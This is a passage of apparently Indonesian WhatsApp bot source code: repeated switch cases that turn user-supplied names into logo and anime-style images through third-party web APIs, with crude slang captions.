Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/glitch?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'glitch2':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/glitch2?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'layered':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/layered?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case '3dsteel':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/3dsteel?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'realistic':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(10)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/realistic?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'lionlogo':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(9)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/lionlogo?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'ninjalogo':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(10)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/ninjalogo?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'wolf':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(5)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		anu = await fetchJson(`https://viko-api.herokuapp.com/api/textpro/logo-wolf2?apikey=vinko&text=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
		break
	case 'bearlogo':
	case 'foxlogo':
	case 'catlogo':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length < 1) return reply(`*Contoh : ${prefix + command} Nama*`)
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		anu = await getBuffer(`https://kuhong-api.herokuapp.com/api/${command}?text=${q}&apikey=${hong}`)
		Revoer.sendMessage(from, anu, image, { caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek })
		break
case 'wolf2':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(6)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		anu = await fetchJson(`https://viko-api.herokuapp.com/api/textpro/logo-wolf?apikey=${F1}&text=viko&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'halloween3':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(11)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/halloween3?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'marvel':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(7)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/marvelstudio?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'marvel2':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/marvelstudio2?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'cinematichorror':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(16)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/cinematichorror?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'avengers':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/avengerslogo?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
		break
	case 'gimage':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		jir = await getBuffer(`https://api.lolhuman.xyz/api/gimage?apikey=${LolKey}&query=${q}`)
		Revoer.sendMessage(from, jir, image, { mimetype: 'image/jpeg', quoted: mek ,filename :'nih.jpeg'})
		break
case 'graffiti3':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(10)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/coolwallgraffiti?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'captainamerica':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(15)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
anu = await fetchJson(`https://apidhani.herokuapp.com/api/textpro/captainamerica?apikey=${dhakey}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Revoer.sendMessage(from, pornhub, image, {caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'girlneko':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(9)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		girlneko = await getBuffer(`https://rest-beni.herokuapp.com/api/canvas/gfx4?teks1=${F1}&teks2=${F2}`)
		Revoer.sendMessage(from, girlneko, image, { mimetype: 'image/jpeg',caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'sadboy':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(7)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		girlneko = await getBuffer(`https://rest-beni.herokuapp.com/api/canvas/gfx3?teks1=${F1}&teks2=${F2}`)
Revoer.sendMessage(from, girlneko, image, {mimetype : 'image/jpeg',caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'makerkaneki':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(12)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		girlneko = await getBuffer(`https://rest-beni.herokuapp.com/api/canvas/gfx1?teks=${F}`)
		Revoer.sendMessage(from, girlneko, image, { mimetype: 'image/jpeg',caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'rem':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(4)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		girlneko = await getBuffer(`https://rest-beni.herokuapp.com/api/canvas/gfx5?teks=${F}`)
		Revoer.sendMessage(from, girlneko, image, { mimetype: 'image/jpeg',caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'lolimaker':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(10)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		girlneko = await getBuffer(`https://rest-beni.herokuapp.com/api/canvas/gfx2?teks=${F}`)
		Revoer.sendMessage(from, girlneko, image, { mimetype: 'image/jpeg',caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break
case 'gura':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply(`*Contoh : ${prefix + command}`)
var F = body.slice(5)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		girlneko = await getBuffer(`https://rest-beni.herokuapp.com/api/canvas/gura?teks=${F}`)
		Revoer.sendMessage(from, girlneko, image, { mimetype: 'image/jpeg',caption: `*Nih Tod,Jangan Spam Request Gambar Su Ngecrash Gwejh*`, quoted: mek})
break

	case 'zenitshu':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
		var F = body.slice(9)
		var F1 = F.split("&")[0];
		var F2 = F.split("&")[1];
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		girlneko = await getBuffer(`https://rest-beni.herokuapp.com/api/canvas/customgfx2?teks1=${F1}&teks2=${F2}&bg=https://telegra.ph/file/88d818ebbc371788ed0be.jpg`)
		Revoer.sendMessage(from, girlneko, image, { mimetype: 'image/jpeg', caption: `*Nih Ajig*`, quoted: mek })
		break

	case 'tanjirou':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
		var F = body.slice(9)
		var F1 = F.split("&")[0];
		var F2 = F.split("&")[1];
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		girlneko = await getBuffer(`https://rest-beni.herokuapp.com/api/canvas/customgfx2?teks1=${F1}&teks2=${F2}&bg=https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/70e2e904-f656-4660-9021-fbf490780b86/de663kn-1d0cce2c-ccf8-4423-8a8a-443d0cc77b8b.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcLzcwZTJlOTA0LWY2NTYtNDY2MC05MDIxLWZiZjQ5MDc4MGI4NlwvZGU2NjNrbi0xZDBjY2UyYy1jY2Y4LTQ0MjMtOGE4YS00NDNkMGNjNzdiOGIucG5nIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.tqD6Eypn8ojcD-SJiHJ1MpbIFyCtiI0RYJUwqSDb3HM`)
		Revoer.sendMessage(from, girlneko, image, { mimetype: 'image/jpeg', caption: `*Nih Ajig*`, quoted: mek })
		break

	case 'mikasagfx':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
		var F = body.slice(10)
		var F1 = F.split("&")[0];
		var F2 = F.split("&")[1];
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		girlneko = await getBuffer(`https://rest-beni.herokuapp.com/api/canvas/customgfx2?teks1=${F1}&teks2=${F2}&bg=https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/45a93d52-ab24-4963-9dc2-413c72680064/dd3gp05-133d04fb-3b3b-47a7-aba8-54bf891ca43c.png/v1/fill/w_600,h_600,q_80,strp/_mikasa__spaingfx__by_syuukii_dd3gp05-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NjAwIiwicGF0aCI6IlwvZlwvNDVhOTNkNTItYWIyNC00OTYzLTlkYzItNDEzYzcyNjgwMDY0XC9kZDNncDA1LTEzM2QwNGZiLTNiM2ItNDdhNy1hYmE4LTU0YmY4OTFjYTQzYy5wbmciLCJ3aWR0aCI6Ijw9NjAwIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmltYWdlLm9wZXJhdGlvbnMiXX0.x_GQC75oxaQwRKSKsZwuhhwvqQ9Qd0Es9oAc0RFi6FI`)
		Revoer.sendMessage(from, girlneko, image, { mimetype: 'image/jpeg', caption: `*Nih Ajig*`, quoted: mek })
		break


	case 'doumagfx':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
		var F = body.slice(10)
		var F1 = F.split("&")[0];
		var F2 = F.split("&")[1];
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		girlneko = await getBuffer(`https://rest-beni.herokuapp.com/api/canvas/customgfx2?teks1=${F1}&teks2=${F2}&bg=https://i.pinimg.com/originals/3c/81/18/3c811849f18ebb36b9cae678bc471289.jpg`)
		Revoer.sendMessage(from, girlneko, image, { mimetype: 'image/jpeg', caption: `*Nih Ajig*`, quoted: mek })
		break

	case 'luffygfx':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
		var F = body.slice(10)
		var F1 = F.split("&")[0];
		var F2 = F.split("&")[1];
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		girlneko = await getBuffer(`https://rest-beni.herokuapp.com/api/canvas/customgfx2?teks1=${F1}&teks2=${F2}&bg=https://a.top4top.io/p_22734s5vx1.jpg`)
		Revoer.sendMessage(from, girlneko, image, { mimetype: 'image/jpeg', caption: `*Nih Ajig*`, quoted: mek })
		break

	case  'makequote':
		case 'quotemake' :
		if (args.length == 0) return reply(`Example: ${prefix + command} gua wibu|wahyu`)
		var okok = body.slice(10)
		var teks = okok.split("|")[0];
		var author = okok.split("|")[1];
		ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/quotemaker2?apikey=${LolKey}&text=${teks}&author=${author}`)
		Revoer.sendMessage(from, ini_buffer, image, { quoted: ftrol, caption: 'Nih Kack' })
		break

	case 'donaldtweet':
		if (args.length == 0) return reply(`Example: ${prefix + command} Gua Ganteng Banget`)
		bjir = await getBuffer(`https://zenzapi.xyz/api/image/trump?text=${q}&apikey=${zenz}`)
		Revoer.sendMessage(from, bjir, image, {mimetype:'image/jpeg' ,quoted: ftrol, caption: 'Nih Kack' })
		break

	case 'doumagfx2':
		if (args.length == 0) return reply(`Example: ${prefix + command} Gua Ganteng Banget`)
		bjir = await getBuffer(`https://rest-beni.herokuapp.com/api/canvas/customgfx1?teks=${q}&bg=https://i.pinimg.com/originals/3c/81/18/3c811849f18ebb36b9cae678bc471289.jpg`)
		Revoer.sendMessage(from, bjir, image, { mimetype: 'image/jpeg', quoted: ftrol, caption: 'Nih Kack' })
		break

	case 'tololserti':
		if (args.length == 0) return reply(`Example: ${prefix + command} Gua Ganteng Banget`)
		bjir = await getBuffer(`https://api.lolhuman.xyz/api/toloserti?apikey=${LolKey}&name=${q}`)
		Revoer.sendMessage(from, bjir, image, { mimetype: 'image/jpeg', quoted: ftrol, caption: 'Nih Kack' })
		break

	case 'goodboyserti':
		if (args.length == 0) return reply(`Example: ${prefix + command} Gua Ganteng Banget`)
		bjir = await getBuffer(`https://api.lolhuman.xyz/api/goodboy?apikey=${LolKey}&name=${q}`)
		Revoer.sendMessage(from, bjir, image, { mimetype: 'image/jpeg', quoted: ftrol, caption: 'Nih Kack' })
		break

	case 'attp':
	case 'ttp':
	case 'ttp2':
	case 'ttp3':
	case 'ttp4':
	case 'ttp5':
